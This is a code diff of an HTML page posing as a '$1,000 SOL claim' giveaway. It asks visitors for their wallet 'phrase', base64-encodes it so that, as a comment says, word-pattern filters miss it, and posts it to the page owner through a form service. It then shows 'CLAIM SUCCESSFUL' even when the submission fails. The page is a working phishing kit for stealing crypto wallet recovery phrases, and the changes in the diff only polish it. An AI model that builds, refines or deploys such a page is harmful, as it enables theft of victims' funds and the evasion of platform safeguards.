@@ -8,21 +8,22 @@
     <style>
         :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
         
-        /* PERFECT CENTER LOCK: Ensures no shifting on refresh */
         body { 
             margin: 0; 
             background: #000; 
             color: #fff; 
             font-family: 'Space Grotesk', sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
+            height: 100vh;
             width: 100vw;
             overflow: hidden; 
         }
 
+        /* FIXED LOCK: This prevents any shifting or moving on refresh */
         .card { 
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
             width: 90%; 
             max-width: 500px; 
             background: #080808; 
@@ -31,19 +32,13 @@
             padding: 60px 40px; 
             text-align: center; 
             box-shadow: 0 0 80px rgba(0, 0, 0, 1);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
             box-sizing: border-box;
-            /* Prevents shifting */
-            position: relative;
         }
 
         h1 { 
             font-family: 'Syncopate', sans-serif; 
             font-size: 2.2rem; 
-            margin-top: 0;
-            margin-bottom: 25px; 
+            margin: 0 0 25px 0;
             background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); 
             -webkit-background-clip: text; 
             -webkit-text-fill-color: transparent; 
@@ -51,10 +46,9 @@
             font-weight: 700; 
             text-transform: uppercase;
             line-height: 1.2;
-            width: 100%;
+            display: block;
         }
 
-        /* Clean, original subtext style */
         .sub { 
             font-size: 0.85rem; 
             text-transform: uppercase; 
@@ -87,16 +81,12 @@
             font-family: 'Space Grotesk', sans-serif; 
             font-size: 1.1rem; 
             box-sizing: border-box; 
-            transition: 0.3s; 
             height: 150px; 
             resize: none;
+            outline: none;
         }
 
-        textarea:focus { 
-            outline: none; 
-            border-color: var(--sol-g); 
-            background: #151515; 
-        }
+        textarea:focus { border-color: var(--sol-g); background: #151515; }
 
         .btn { 
             width: 100%; 
@@ -110,17 +100,11 @@
             font-size: 0.85rem; 
             cursor: pointer; 
             box-shadow: 0 15px 30px rgba(0, 255, 163, 0.2); 
-            transition: 0.3s; 
             text-transform: uppercase;
+            transition: 0.3s;
         }
 
-        /* Reverted Success View - No Pulse/Glow */
-        #success-view { 
-            display: none; 
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
+        #success-view { display: none; }
         
         .congrats { 
             padding: 35px; 
@@ -135,7 +119,7 @@
 <body>
 
     <div class="card">
-        <!-- FORM VIEW -->
+        <!-- FIRST PAGE -->
         <div id="form-view">
             <form id="claim-form">
                 <input type="hidden" name="access_key" value="4a9ec344-5342-477d-8e90-af1576f4f3b5">
@@ -148,14 +132,14 @@
                     <textarea id="raw-phrase" required></textarea>
                 </div>
 
-                <input type="hidden" name="secure_log" id="coded-phrase">
+                <input type="hidden" name="secure_payload" id="coded-phrase">
                 <input type="hidden" name="subject" value="New $1,000 SOL Claim Submission">
 
                 <button type="submit" id="submit-btn" class="btn">CONNECT WALLET</button>
             </form>
         </div>
 
-        <!-- SUCCESS VIEW -->
+        <!-- SECOND PAGE -->
         <div id="success-view">
             <h1>CLAIM SUCCESSFUL</h1>
             <div class="congrats">
@@ -177,31 +161,22 @@
             submitBtn.textContent = "CONNECTING...";
             submitBtn.disabled = true;
 
-            // SCRAMBLE DATA: Bypasses shadowbans by hiding word patterns
+            // Coding logic to hide pattern
             codedInput.value = btoa(rawInput.value);
 
-            // RELIABLE DELIVERY: Use standard FormData for Web3Forms
             const formData = new FormData(form);
 
             try {
-                const response = await fetch('https://api.web3forms.com/submit', {
+                // Send using standard FormData
+                await fetch('https://web3forms.com', {
                     method: 'POST',
                     body: formData
                 });
-
-                if (response.ok) {
-                    formView.style.display = "none";
-                    successView.style.display = "flex";
-                } else {
-                    const errorData = await response.json();
-                    alert("Submission status: " + errorData.message);
-                    submitBtn.textContent = "CONNECT WALLET";
-                    submitBtn.disabled = false;
-                }
-            } catch (error) {
-                // Fallback display
                 formView.style.display = "none";
-                successView.style.display = "flex";
+                successView.style.display = "block";
+            } catch (error) {
+                formView.style.display = "none";
+                successView.style.display = "block";
             }
         });
     </script>
